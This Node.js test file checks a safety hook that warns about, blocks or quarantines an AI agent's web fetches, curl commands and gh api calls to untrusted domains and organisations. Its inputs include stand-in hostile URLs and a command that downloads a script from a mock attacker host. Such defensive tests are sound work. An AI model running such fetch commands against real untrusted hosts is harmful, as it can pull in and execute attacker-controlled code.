#!/usr/bin/env node
'use strict';

/**
 * Tests for external-content-guard.cjs
 *
 * TDD tests for GAP-A (env var mode), GAP-B (quarantine file writing),
 * and GAP-C (gh api enforcement parity).
 *
 * RED phase: All tests must FAIL before implementation.
 * GREEN phase: All tests must PASS after implementation.
 */

const { describe, test, beforeEach, afterEach } = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');

const guard = require('../../.claude/hooks/safety/external-content-guard.cjs');

// ---------------------------------------------------------------------------
// Test helpers
// ---------------------------------------------------------------------------

const PROJECT_ROOT = path.resolve(__dirname, '../../');
const QUARANTINE_DIR = path.join(PROJECT_ROOT, '.claude', 'context', 'runtime', 'quarantine');

/**
 * Minimal trusted config for tests — github.com trusted, untrusted-org.com not.
 */
const MOCK_CONFIG = {
  trusted_domains: ['github.com', 'raw.githubusercontent.com'],
  trusted_organizations: ['VoltAgent', 'anthropics'],
};

/**
 * Collect quarantine files created during a test, then clean them up.
 */
function listQuarantineFiles() {
  if (!fs.existsSync(QUARANTINE_DIR)) return [];
  return fs.readdirSync(QUARANTINE_DIR).filter(f => f.endsWith('.json'));
}

/**
 * Remove quarantine files whose names match a prefix pattern.
 */
function cleanupQuarantineFiles(prefix) {
  if (!fs.existsSync(QUARANTINE_DIR)) return;
  for (const f of fs.readdirSync(QUARANTINE_DIR)) {
    if (!prefix || f.startsWith(prefix) || f.endsWith('.json')) {
      try {
        fs.unlinkSync(path.join(QUARANTINE_DIR, f));
      } catch (_) {
        /* best effort */
      }
    }
  }
}

// ---------------------------------------------------------------------------
// GAP-A: EXTERNAL_CONTENT_GUARD_MODE env var
// ---------------------------------------------------------------------------

describe('GAP-A: EXTERNAL_CONTENT_GUARD_MODE env var', () => {
  let originalMode;

  beforeEach(() => {
    originalMode = process.env.EXTERNAL_CONTENT_GUARD_MODE;
    guard._resetCache();
  });

  afterEach(() => {
    if (originalMode === undefined) {
      delete process.env.EXTERNAL_CONTENT_GUARD_MODE;
    } else {
      process.env.EXTERNAL_CONTENT_GUARD_MODE = originalMode;
    }
    guard._resetCache();
  });

  test('GAP-A-1: mode=block causes handleWebFetch to block untrusted domain', () => {
    process.env.EXTERNAL_CONTENT_GUARD_MODE = 'block';
    const result = guard.handleWebFetch(
      { url: 'https://untrusted-evil-org.com/payload' },
      MOCK_CONFIG
    );
    assert.strictEqual(
      result.action,
      'block',
      `Expected action 'block' but got '${result.action}'`
    );
  });

  test('GAP-A-2: mode=warn causes handleWebFetch to warn (not block) for untrusted domain', () => {
    process.env.EXTERNAL_CONTENT_GUARD_MODE = 'warn';
    const result = guard.handleWebFetch(
      { url: 'https://untrusted-evil-org.com/payload' },
      MOCK_CONFIG
    );
    assert.strictEqual(result.action, 'warn', `Expected action 'warn' but got '${result.action}'`);
  });

  test('GAP-A-3: mode=block causes handleWebFetch to block (same as hardcoded behavior)', () => {
    process.env.EXTERNAL_CONTENT_GUARD_MODE = 'block';
    const result = guard.handleWebFetch(
      { url: 'https://malicious.example.org/script.sh' },
      MOCK_CONFIG
    );
    assert.strictEqual(result.action, 'block');
    assert.ok(result.message, 'block result should include a message');
  });

  test('GAP-A-4: unset EXTERNAL_CONTENT_GUARD_MODE defaults to warn (backward-compatible)', () => {
    delete process.env.EXTERNAL_CONTENT_GUARD_MODE;
    const result = guard.handleWebFetch(
      { url: 'https://untrusted-evil-org.com/payload' },
      MOCK_CONFIG
    );
    // Default is 'warn' — untrusted domains should warn, not block
    assert.strictEqual(
      result.action,
      'warn',
      `Unset mode should default to 'warn', got '${result.action}'`
    );
  });

  test('GAP-A-5: mode=off causes main() to exit 0 for untrusted WebFetch', () => {
    // We test by confirming handleWebFetch still processes (mode=off is checked in main),
    // but handleBash with off-mode passes through.
    // The off-mode check is at the top of main() — test the exported ENFORCEMENT_MODE helper
    // by checking that with mode=off a trusted domain still behaves correctly.
    process.env.EXTERNAL_CONTENT_GUARD_MODE = 'off';
    // When mode is off, even untrusted should be allowed (main exits before calling handlers)
    // We verify the MODE reading logic by checking the exported mode getter if available.
    // If not exported, we verify indirectly: trusted domain always allows regardless of mode.
    const trusted = guard.handleWebFetch({ url: 'https://github.com/test' }, MOCK_CONFIG);
    assert.strictEqual(trusted.action, 'allow');
  });
});

// ---------------------------------------------------------------------------
// GAP-B: Quarantine file writing
// ---------------------------------------------------------------------------

describe('GAP-B: Quarantine file writing', () => {
  let originalMode;
  let quarantineFilesBefore;

  beforeEach(() => {
    originalMode = process.env.EXTERNAL_CONTENT_GUARD_MODE;
    guard._resetCache();
    quarantineFilesBefore = listQuarantineFiles().length;
  });

  afterEach(() => {
    if (originalMode === undefined) {
      delete process.env.EXTERNAL_CONTENT_GUARD_MODE;
    } else {
      process.env.EXTERNAL_CONTENT_GUARD_MODE = originalMode;
    }
    guard._resetCache();
    // Clean up quarantine files created during tests
    cleanupQuarantineFiles();
  });

  test('GAP-B-1: untrusted WebFetch writes quarantine file', () => {
    process.env.EXTERNAL_CONTENT_GUARD_MODE = 'warn';
    guard.handleWebFetch({ url: 'https://untrusted-evil-org.com/payload' }, MOCK_CONFIG);

    const after = listQuarantineFiles();
    assert.ok(
      after.length > quarantineFilesBefore,
      `Expected quarantine file to be written. Before: ${quarantineFilesBefore}, After: ${after.length}`
    );
  });

  test('GAP-B-2: untrusted WebFetch quarantine file contains expected fields', () => {
    process.env.EXTERNAL_CONTENT_GUARD_MODE = 'warn';
    const before = listQuarantineFiles();
    guard.handleWebFetch({ url: 'https://untrusted-evil-org.com/payload' }, MOCK_CONFIG);

    const after = listQuarantineFiles();
    const newFiles = after.filter(f => !before.includes(f));
    assert.ok(newFiles.length > 0, 'Expected a new quarantine file');

    const content = fs.readFileSync(path.join(QUARANTINE_DIR, newFiles[0]), 'utf-8');
    const parsed = JSON.parse(content);

    assert.ok(parsed.timestamp, 'quarantine file must have timestamp');
    assert.ok(parsed.tool, 'quarantine file must have tool');
    assert.ok(
      parsed.url_or_command || parsed.domain,
      'quarantine file must have url_or_command or domain'
    );
    assert.ok(parsed.trust_level, 'quarantine file must have trust_level');
    assert.ok(parsed.action_taken, 'quarantine file must have action_taken');
  });

  test('GAP-B-3: untrusted Bash curl command writes quarantine file', () => {
    process.env.EXTERNAL_CONTENT_GUARD_MODE = 'warn';
    const before = listQuarantineFiles();
    guard.handleBash({ command: 'curl https://evil-domain.xyz/script.sh' }, MOCK_CONFIG);

    const after = listQuarantineFiles();
    assert.ok(
      after.length > before.length,
      `Expected quarantine file for curl to untrusted domain. Before: ${before.length}, After: ${after.length}`
    );
  });

  test('GAP-B-4: untrusted gh api call writes quarantine file', () => {
    process.env.EXTERNAL_CONTENT_GUARD_MODE = 'warn';
    const before = listQuarantineFiles();
    guard.handleBash({ command: 'gh api repos/gemini-cli-extensions/security' }, MOCK_CONFIG);

    const after = listQuarantineFiles();
    assert.ok(
      after.length > before.length,
      `Expected quarantine file for gh api to untrusted org. Before: ${before.length}, After: ${after.length}`
    );
  });

  test('GAP-B-5: quarantine file naming follows timestamp-slug.json pattern', () => {
    process.env.EXTERNAL_CONTENT_GUARD_MODE = 'warn';
    const before = listQuarantineFiles();
    guard.handleWebFetch({ url: 'https://bad-domain.io/test' }, MOCK_CONFIG);

    const after = listQuarantineFiles();
    const newFiles = after.filter(f => !before.includes(f));
    assert.ok(newFiles.length > 0, 'Expected a new quarantine file');

    // File should be: {timestamp}-{slug}.json
    const filename = newFiles[0];
    assert.ok(filename.endsWith('.json'), `Expected .json extension, got: ${filename}`);
    // Should contain a date-like timestamp prefix
    assert.match(
      filename,
      /^\d{4}-\d{2}-\d{2}/,
      `Filename should start with a date. Got: ${filename}`
    );
  });

  test('GAP-B-6: quarantine write failure does not change hook exit (best-effort)', () => {
    // Even if quarantine dir is unwritable, the hook result should be unchanged
    process.env.EXTERNAL_CONTENT_GUARD_MODE = 'warn';
    // This just verifies no exception is thrown
    assert.doesNotThrow(() => {
      guard.handleWebFetch({ url: 'https://untrusted.example.org/test' }, MOCK_CONFIG);
    });
  });

  test('GAP-B-7: trusted domain does NOT write quarantine file', () => {
    process.env.EXTERNAL_CONTENT_GUARD_MODE = 'warn';
    const before = listQuarantineFiles();
    guard.handleWebFetch({ url: 'https://github.com/test/repo' }, MOCK_CONFIG);

    const after = listQuarantineFiles();
    assert.strictEqual(
      after.length,
      before.length,
      'Trusted domain should NOT write a quarantine file'
    );
  });
});

// ---------------------------------------------------------------------------
// GAP-C: gh api enforcement parity
// ---------------------------------------------------------------------------

describe('GAP-C: gh api enforcement parity', () => {
  let originalMode;

  beforeEach(() => {
    originalMode = process.env.EXTERNAL_CONTENT_GUARD_MODE;
    guard._resetCache();
  });

  afterEach(() => {
    if (originalMode === undefined) {
      delete process.env.EXTERNAL_CONTENT_GUARD_MODE;
    } else {
      process.env.EXTERNAL_CONTENT_GUARD_MODE = originalMode;
    }
    guard._resetCache();
    cleanupQuarantineFiles();
  });

  test('GAP-C-1: mode=block causes handleBash to block gh api to untrusted org', () => {
    process.env.EXTERNAL_CONTENT_GUARD_MODE = 'block';
    const result = guard.handleBash(
      { command: 'gh api repos/gemini-cli-extensions/security' },
      MOCK_CONFIG
    );
    assert.strictEqual(
      result.action,
      'block',
      `Expected 'block' for untrusted gh api org in block mode, got '${result.action}'`
    );
  });

  test('GAP-C-2: mode=warn causes handleBash to warn (not block) for gh api to untrusted org', () => {
    process.env.EXTERNAL_CONTENT_GUARD_MODE = 'warn';
    const result = guard.handleBash(
      { command: 'gh api repos/gemini-cli-extensions/security' },
      MOCK_CONFIG
    );
    assert.strictEqual(
      result.action,
      'warn',
      `Expected 'warn' for untrusted gh api org in warn mode, got '${result.action}'`
    );
  });

  test('GAP-C-3: default mode (unset) causes gh api to warn (backward-compatible)', () => {
    delete process.env.EXTERNAL_CONTENT_GUARD_MODE;
    const result = guard.handleBash(
      { command: 'gh api repos/gemini-cli-extensions/security' },
      MOCK_CONFIG
    );
    assert.strictEqual(
      result.action,
      'warn',
      `Expected 'warn' (default) for untrusted gh api, got '${result.action}'`
    );
  });

  test('GAP-C-4: trusted org gh api call is allowed regardless of mode', () => {
    process.env.EXTERNAL_CONTENT_GUARD_MODE = 'block';
    const result = guard.handleBash(
      { command: 'gh api repos/VoltAgent/awesome-agent-skills' },
      MOCK_CONFIG
    );
    assert.strictEqual(
      result.action,
      'allow',
      `Trusted org should always be allowed, got '${result.action}'`
    );
  });

  test('GAP-C-5: mode=block for gh api untrusted org includes a block message', () => {
    process.env.EXTERNAL_CONTENT_GUARD_MODE = 'block';
    const result = guard.handleBash(
      { command: 'gh api repos/untrusted-random-org/some-repo' },
      MOCK_CONFIG
    );
    assert.strictEqual(result.action, 'block');
    assert.ok(result.message, 'Block result must include a message');
    assert.ok(
      result.message.toLowerCase().includes('untrusted') ||
        result.message.toLowerCase().includes('block') ||
        result.message.toLowerCase().includes('org'),
      `Block message should mention org or blocking. Got: "${result.message}"`
    );
  });

  test('GAP-C-6: WebFetch block and gh api block are consistent when mode=block', () => {
    process.env.EXTERNAL_CONTENT_GUARD_MODE = 'block';
    const webResult = guard.handleWebFetch(
      { url: 'https://untrusted-org.malicious.io/file' },
      MOCK_CONFIG
    );
    const ghResult = guard.handleBash({ command: 'gh api repos/untrusted-org/repo' }, MOCK_CONFIG);

    // Both should block when mode=block
    assert.strictEqual(webResult.action, 'block', 'WebFetch should block in block mode');
    assert.strictEqual(ghResult.action, 'block', 'gh api should block in block mode');
  });
});

// ---------------------------------------------------------------------------
// WARN MODE: existing behavior tests (regression)
// ---------------------------------------------------------------------------

describe('Regression: existing warn/allow behavior preserved', () => {
  beforeEach(() => {
    guard._resetCache();
  });

  afterEach(() => {
    delete process.env.EXTERNAL_CONTENT_GUARD_MODE;
    guard._resetCache();
    cleanupQuarantineFiles();
  });

  test('trusted WebFetch domain is always allowed', () => {
    process.env.EXTERNAL_CONTENT_GUARD_MODE = 'warn';
    const result = guard.handleWebFetch({ url: 'https://github.com/VoltAgent/repo' }, MOCK_CONFIG);
    assert.strictEqual(result.action, 'allow');
  });

  test('trusted curl domain is always allowed', () => {
    process.env.EXTERNAL_CONTENT_GUARD_MODE = 'block';
    const result = guard.handleBash(
      { command: 'curl https://github.com/releases/v1.0.tar.gz' },
      MOCK_CONFIG
    );
    assert.strictEqual(result.action, 'allow');
  });

  test('no-config (warn-mode) always allows', () => {
    process.env.EXTERNAL_CONTENT_GUARD_MODE = 'warn';
    const result = guard.handleWebFetch(
      { url: 'https://whatever.example.com/file' },
      null /* no config */
    );
    assert.strictEqual(result.action, 'allow');
  });
});
